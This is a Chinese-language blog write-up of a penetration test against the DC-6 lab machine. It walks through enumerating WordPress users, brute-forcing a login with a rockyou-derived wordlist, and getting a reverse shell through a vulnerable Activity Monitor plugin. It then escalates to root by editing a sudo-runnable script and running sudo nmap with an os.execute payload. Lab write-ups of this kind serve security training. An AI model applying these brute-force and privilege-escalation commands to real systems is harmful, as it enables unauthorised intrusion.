---
title: DC_6靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false



---

# DC_6靶机渗透测试



[参考文章链接1]([DC6 靶机渗透_Micr067的博客-CSDN博客_dc6靶机实验](https://blog.csdn.net/weixin_41082546/article/details/99192403))

[参考文章链接2]([DC6靶机渗透 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1803554?from=article.detail.1803068))

- 扫描一下靶机的位置以及开放的端口

![image-20210702160244453](http://cdn.mxrblog.cn/image-20210702160244453.png)

- 发现开启了22号和80号端口，浏览器打开靶机的http服务，发现找不到服务器，将靶机的IP地址添加到攻击机器的hosts文件中

![image-20210702163400364](http://cdn.mxrblog.cn/image-20210702163400364.png)

- 再次扫描一下版本信息，发现是wordpress 5.1.1

![image-20210702163302186](http://cdn.mxrblog.cn/image-20210702163302186.png)

- 用wpscan对靶机进行扫描，并枚举出用户

```
wpscan --url http://wordy -e u
```

![image-20210702165812742](http://cdn.mxrblog.cn/image-20210702165812742.png)

- 使用dirb扫描出后台

```
dirb http://192.168.0.141
```

![image-20210702164837984](http://cdn.mxrblog.cn/image-20210702164837984.png)

![image-20210702164819136](http://cdn.mxrblog.cn/image-20210702164819136.png)

- 创建用户字典和密码字典（根据作者的提示创建密码字典，要不然不会花很多时间）

![image-20210702180204049](http://cdn.mxrblog.cn/image-20210702180204049.png)

```
vim users
将前面扫描出来的用户名填入users中   //创建用户名密码
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt  //创建密码字典
```

- 使用wpscan暴力破解密码

![image-20210702180757718](http://cdn.mxrblog.cn/image-20210702180757718.png)

- 发现被破解出来的账号是mark， 密码是helpdesk01,登录后台查看，发现插件Activity monitor

![image-20210702205156235](http://cdn.mxrblog.cn/image-20210702205156235.png)

- 搜索插件漏洞

![image-20210702213616394](http://cdn.mxrblog.cn/image-20210702213616394.png)

![image-20210702214526740](http://cdn.mxrblog.cn/image-20210702214526740.png)

- 查看漏洞文件， 根据提示将里面的IP和port参数改成攻击机器的

![image-20210702221445846](http://cdn.mxrblog.cn/image-20210702221445846.png)

- 在攻击机器上开启http服务

```
python -m SimpleHTTPServer 8000   //上面文件中的web端口为8000，我未改 
```

- 先在本地nc监听4444端口，然后在浏览器中访问本机8000端口，点击漏洞文件触发漏洞，攻击机器获取shell

![image-20210702223217998](http://cdn.mxrblog.cn/image-20210702223217998.png)

- 将当前shell变为交互式shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210702223514883](http://cdn.mxrblog.cn/image-20210702223514883.png)

- 发现需要继续提权

![image-20210702224218248](http://cdn.mxrblog.cn/image-20210702224218248.png)

- 在用户mark的目录下发现stuff文件夹中有个things-to-do.txt,查看文件后发现一个新用户密码

![image-20210702225134596](http://cdn.mxrblog.cn/image-20210702225134596.png)

- 切换用户

![image-20210702225219547](http://cdn.mxrblog.cn/image-20210702225219547.png)

- 寻找可以进行提权的文件和当前用户可以使用的特殊权限

![image-20210702225845757](http://cdn.mxrblog.cn/image-20210702225845757.png)

- 查看一下backups.sh的内容，发现个解压命令，将其替换成  /bin/bash
- 可以ssh链接靶机，用攻击机对靶机的文件进行修改

![image-20210702232340650](http://cdn.mxrblog.cn/image-20210702232340650.png)

- 以jens用户运行脚本

![image-20210702232549101](http://cdn.mxrblog.cn/image-20210702232549101.png)

- 继续查看当前用户能使用什么特殊权限，发现能使用nmap

![image-20210702232745098](http://cdn.mxrblog.cn/image-20210702232745098.png)

- 使用nmap调用脚本

```js
echo 'os.execute("/bin/bash")' >shell_root
sudo nmap --script=shell_root
```

![image-20210702233430749](http://cdn.mxrblog.cn/image-20210702233430749.png)

